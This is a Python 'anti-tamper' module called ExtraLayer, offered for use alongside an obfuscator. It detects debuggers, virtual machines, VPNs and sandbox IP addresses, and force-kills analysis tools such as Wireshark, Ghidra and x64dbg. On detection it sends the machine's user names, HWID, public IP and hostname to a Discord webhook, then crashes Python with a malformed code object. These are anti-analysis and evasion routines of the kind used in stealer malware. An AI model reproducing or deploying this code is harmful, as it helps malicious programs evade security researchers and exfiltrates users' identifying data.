# // Normal Imports
import math
import random
import json
import socket
import subprocess
import sys
import uuid
import hashlib
import time
from threading import Thread
from requests import get, post
from os import system, path, environ, _exit
from win32gui import GetWindowText,EnumWindows
from win32process import GetWindowThreadProcessId
from psutil import Process,process_iter, virtual_memory, cpu_count, disk_usage, users
from winreg import HKEY_LOCAL_MACHINE, OpenKey, CloseKey, QueryValueEx

# Created by BugleBoy#1234
# ExtraLayer | An extra-layer between you and the code.
# ExtraLayer | Should be used along with a obfuscator!

# // Secondary Class for logging.
class Discord:
    def __init__(self, *, url):
        self.url = url

    def post(
        self,
        *,
        content=None,
        username=None,
        avatar_url=None,
        tts=False,
        file=None,
        embeds=None,
        allowed_mentions=None
    ):
        if content is None and file is None and embeds is None:
            raise ValueError("required one of content, file, embeds")
        data = {}
        if content is not None:
            data["content"] = content
        if username is not None:
            data["username"] = username
        if avatar_url is not None:
            data["avatar_url"] = avatar_url
        data["tts"] = tts
        if embeds is not None:
            data["embeds"] = embeds
        if allowed_mentions is not None:
            data["allowed_mentions"] = allowed_mentions
        if file is not None:
            return post(
                self.url, {"payload_json": json.dumps(data)}, files=file
            )
        else:
            return post(
                self.url, json.dumps(data), headers={"Content-Type": "application/json"}
            )

# // Main Class
class ExtraLayer:
    # // Settings
    LAYER_SEND_REASON = True # // Send the reason of exiting | might help them debug... so use at cation!
    LAYER_SEND_INFO = False # // Send debug info, of user | might help you debug if ExtraLayer is causing problems!
    LAYER_DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/..../........"

    # // Extras

    self_file =  path.basename(sys.argv[0]) # // The name of the file (in-case it gets re-named)

    if LAYER_DISCORD_WEBHOOK != "":
        try:
            UserWebHook = Discord(url=str(LAYER_DISCORD_WEBHOOK))
        except Exception as errored:
            if LAYER_SEND_INFO:
                print(f"DEBUG: Could not assign WebHook! | {errored}")

    # // Error Reasons (Change at risk)
    LAYER_REASONS = {
        "_CHECK_WINDOWS":["Found Debugger, Type: {debugger}"],
        "_CHECK_IP":["Blacklisted IP!"],
        "_CHECK_VM":["Detected VM(VPS) 0x1"],
        "_CHECK_REGISTRY":["Detected VM(VPS) 0x2"],
        "_CHECK_DLL":["Detected VM(VPS) 0x3"],
        "_CHECK_SPECS":["MEMORY Invalid!","STORAGE Invalid!","CPU Counts, invalid!"],
        "_JUNK_CODE":[f"{self_file} WAS CHANGED!"],
        "_PROXIED_CONNECTION":["ConnectionTest failed, using proxied connection! \nProxy: {usingproxy} \nType: {proxytype}"],
        "_CONNECTION_TEST":["ConnectionTest failed, try re-connecting to WiFi!"],
        "_ERRORED":["[Core] ExtraLayer has reported a fatal-error! \nReport at: `https://github.com/ImInTheICU/Python-AntiTamper` \nERROR: {error}"],
        }


    # // Methods
    def _EXIT(reason):
        if ExtraLayer.LAYER_SEND_REASON:
            print(reason)
        if ExtraLayer.LAYER_SEND_INFO:
            print("DEBUG: _EXIT")
        if ExtraLayer.UserWebHook:
            try:
                # // Gets All USERS, Bad method of appending (please update), thanks!
                USERS = """"""
                PC_USERS = users()
                for PC_USER in PC_USERS:
                    USERS += f"{PC_USER.name} | "

                # // Get HWID/UUID
                USER_HWID = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
                
                # // Get IP
                USER_IP = get('https://api64.ipify.org/').text.strip()

                # // Get HostName (Running User).
                if socket.gethostname().find('.')>=0:
                    USER = socket.gethostname()
                else:
                    USER = socket.gethostbyaddr(socket.gethostname())[0]

                ExtraLayer.UserWebHook.post(
                    username="ExtraLayer Services",
                    avatar_url="https://raw.githubusercontent.com/ImInTheICU/Python-AntiTamper/main/_ExtraLayer128x128.jpg",
                    embeds=[
                        {
                            "author": {
                                "name": "Anti-Debugger",
                                "url": "https://github.com/ImInTheICU/Python-AntiTamper",
                            },
                            "title": "PC INFO",
                            "description": "**Warning: Sensitive information, DONT SHARE OR LEAK!**",
                            "fields": [
                                {"name": "PC INFO", "value": f"```\nPC Name: {USER} \nPC's: {USERS} \nPC-HWID: {USER_HWID} \nIP: {USER_IP} \n```"},
                                {"name": "Detection", "value": f"```\nExtraLayer Detected: {reason} \n```"},
                            ],

                            "footer": {
                                "text": "Protected by ExtraLayer!",
                            },
                        }
                    ],
                )
            except Exception as errored:
                ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_ERRORED"][0].format(error = errored))
        
        exec(type((lambda: 0).__code__)(0, 0, 0, 0, 0, 0, b'\x053', (), (), (), '', '', 0, b'')) 

    def _CHECK_WINDOWS():
        if ExtraLayer.LAYER_SEND_INFO:
            print("DEBUG: _CHECK_WINDOWS")
        def winEnumHandler( hwnd, ctx ):
            if GetWindowText( hwnd ).lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'wpe pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit'}:
                pid = GetWindowThreadProcessId(hwnd)
                if type(pid) == int:
                    try: Process(pid).terminate()
                    except: pass
                else:
                    for process in pid:
                        try: Process(process).terminate()
                        except: pass
                if ExtraLayer.LAYER_SEND_INFO:
                    print("DEBUG: _CHECK_WINDOWS | Failed")
                ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_WINDOWS"][0].format(debugger = {GetWindowText( hwnd )}))
        while True: EnumWindows( winEnumHandler, None )

    def _CHECK_IP():
        if ExtraLayer.LAYER_SEND_INFO:
            print("DEBUG: _CHECK_IP")
        blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160', '', '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}
        while True:
            try:
                ip = get('https://api64.ipify.org/').text.strip()
                if ip in blacklisted: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_IP"][0])
                return
            except: pass

    def _CHECK_VM():
        if ExtraLayer.LAYER_SEND_INFO:
            print("DEBUG: _CHECK_VM")
        processes = ['VMwareService.exe', 'VMwareTray.exe']
        for proc in process_iter():
            if proc.name() in processes: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_VM"][0])

    def _CHECK_REGISTRY():
        if ExtraLayer.LAYER_SEND_INFO:
            print("DEBUG: _CHECK_REGISTRY")
        if system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul") != 1 and system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul") != 1: ExtraLayer._EXIT('Detected Vm')
        handle = OpenKey(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            if "VMware" in QueryValueEx(handle, '0')[0] or "VBOX" in QueryValueEx(handle, '0')[0]: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_REGISTRY"][0])
        finally: CloseKey(handle)

    def _CHECK_DLL():
        if ExtraLayer.LAYER_SEND_INFO:
            print("DEBUG: _CHECK_DLL")
        if path.exists(path.join(environ["SystemRoot"], "System32\\vmGuestLib.dll")) or path.exists(path.join(environ["SystemRoot"], "vboxmrxnp.dll")):  ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_DLL"][0])

    def _CHECK_SPECS():
        if ExtraLayer.LAYER_SEND_INFO:
            print("DEBUG: _CHECK_SPECS")
        if int(str(virtual_memory()[0]/1024/1024/1024).split(".")[0]) <= 4: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_SPECS"][0])
        if int(str(disk_usage('/')[0]/1024/1024/1024).split(".")[0]) <= 50: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_SPECS"][1])
        if int(cpu_count()) <= 1: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_SPECS"][2])


    # // Get CHECKSUM
    def _GET_CHECKSUM():
        md5_hash = hashlib.md5()
        file = open(''.join(sys.argv), "rb")
        md5_hash.update(file.read())
        digest = md5_hash.hexdigest()
        if ExtraLayer.LAYER_SEND_INFO:
            print(f"DEBUG: _GET_CHECKSUM | {digest}")
        return digest

    # // Remove Junk
    def _RM_JUNK(JunkCode:str):
        try: 
            with open(ExtraLayer.self_file, "r+") as text_file:
                texts = text_file.read()
                texts = texts.replace(JunkCode, "")
            with open(ExtraLayer.self_file, "w") as text_file:
                text_file.write(texts)
            return ExtraLayer._GET_CHECKSUM()
        except Exception as errored:
            ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_ERRORED"][0].format(error = errored))


    # // Add Junk
    def _ADD_JUNK():
        with open(ExtraLayer.self_file, 'a+') as PythonFile:
            JUNK_ID = uuid.uuid4().hex
            JUNK_ID2 = uuid.uuid4().hex

            # // Randomize even more!
            Headers = (
                f'def _{JUNK_ID}_():', 
                f'class _{JUNK_ID}_():',
            )
            # // Random Spam
            Bodies = (
                f'= exec(print("{JUNK_ID}"))', 
                f'= exec(math.ceil({random.randint(1,1000)}) * math.exp({random.randint(1,1000)}))',
                f'= exec(str("{ExtraLayer.self_file}") + str("_FILE"))',
                f'= exec(math.floor({random.randint(1,1000)} / math.ceil({random.randint(1,5000)})))',
                f'= exec({math.hypot(1.0, 100.0)} - {random.randint(303,30482)})',
                f'= exec(print("Protected by ExtraLayer | Github"))',
                f'= exec(print("L + Ratio | Check out Hyperion!"))'
            )

            # // Allow's to return the VAR (for calling it) or the Joint (for defining it)
            def _QUICK_CALL_JUNKCODE(type:bool):
                BodieName = f"Execute_{random.randint(1,100)}"
                if type == True:
                    return BodieName
                elif type == False:
                    BodieJoint = f"{BodieName} {random.choice(Bodies)}"
                    return BodieJoint

            # // Everything in 'JunkCode' is pear junk, dw about it
            JunkCode = f"""
# ; ) dont worry about this
{random.choice(Headers)}
    def _{JUNK_ID}_():
        {_QUICK_CALL_JUNKCODE(False)}
        {_QUICK_CALL_JUNKCODE(False)}
        {_QUICK_CALL_JUNKCODE(False)}
        {_QUICK_CALL_JUNKCODE(False)}

        {_QUICK_CALL_JUNKCODE(True)}() # Call Protection!
    _{JUNK_ID}_() # Call Functions for byte334 code!
    
    def _{JUNK_ID}_():
        {_QUICK_CALL_JUNKCODE(False)}
        {_QUICK_CALL_JUNKCODE(False)}
        {_QUICK_CALL_JUNKCODE(False)}
        {_QUICK_CALL_JUNKCODE(False)}

        {_QUICK_CALL_JUNKCODE(True)}() # Call Protection!
    _{JUNK_ID}_() # Call Functions for byte2 code!

    # call p2p class (bro api)
    class _{JUNK_ID2}_():
        def _{JUNK_ID}_():
            {_QUICK_CALL_JUNKCODE(False)}
            {_QUICK_CALL_JUNKCODE(False)}
            {_QUICK_CALL_JUNKCODE(False)}
            {_QUICK_CALL_JUNKCODE(False)}

            {_QUICK_CALL_JUNKCODE(True)}() # Call Protection!  
    returns = _{JUNK_ID2}_() # just incase byte code fails ; )
    print(returns)
            """

            # // Write junk-code to self_file
            PythonFile.write(f"{JunkCode}")

            # // Returning junk-code, for removal
            return JunkCode

    def _JUNK_CODE():
        while True:
            CheckSum = ExtraLayer._GET_CHECKSUM()
            JunkCode = ExtraLayer._ADD_JUNK() # // ADD JUNK CODE (Returns the junk-code)
            if ExtraLayer.LAYER_SEND_INFO and JunkCode:
                print("DEBUG: Added Junk")
            time.sleep(1)
            RM_CHECK = ExtraLayer._RM_JUNK(JunkCode=JunkCode) # // REMOVE JUNK CODE (Takes junk-code as a input)
            if ExtraLayer.LAYER_SEND_INFO and RM_CHECK:
                print("DEBUG: Removed Junk")
            NewCheckSum = ExtraLayer._GET_CHECKSUM()
            if CheckSum == NewCheckSum:
                time.sleep(0.5) # // Waiting,
            else:
                ExtraLayer._EXIT(f'{ExtraLayer.LAYER_REASONS["_JUNK_CODE"][0]}') # // Hard-Exit (On-Changes)

    def _CONNECTION_TEST():
        while True:
            try:
                connection_ip = get('https://api64.ipify.org/').text.strip()
                proxy_callback = get(f"https://proxycheck.io/v2/{connection_ip}?vpn=1").json()
                if "ok" in proxy_callback['status']:
                    if "yes" in proxy_callback[connection_ip]['proxy']:
                        ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_PROXIED_CONNECTION"][0].format(usingproxy = proxy_callback[connection_ip]['proxy'], proxytype = proxy_callback[connection_ip]['type']))
            except Exception as errored:
                ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_ERRORED"][0].format(error = errored))
            time.sleep(5)

    # // Main | Startup
    def _START_LAYER():
        # // Doing Platform checks...
        if sys.platform.startswith("linux") or sys.platform == "darwin": 
            ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_ERRORED"][0].format(error = "Don't report this | PLATFORM IS NOT SUPPORTED (WINDOWS REQUIRED)!"))
        if ExtraLayer.LAYER_SEND_INFO:
            print("DEBUG: Start_Layer was called!")

        checks = (
            ExtraLayer._CHECK_WINDOWS,
            ExtraLayer._CHECK_IP,
            ExtraLayer._CHECK_REGISTRY,
            ExtraLayer._CHECK_DLL,
            ExtraLayer._CHECK_SPECS,
            ExtraLayer._CHECK_VM,
            ExtraLayer._JUNK_CODE,
            ExtraLayer._CONNECTION_TEST,
        ) # // You can add,remove checks here!
        
        for check in checks: Thread(target=check,daemon=True).start() # // Start all layers, enabled
        if ExtraLayer.LAYER_SEND_INFO:
            print(f"DEBUG: {check}, was started!")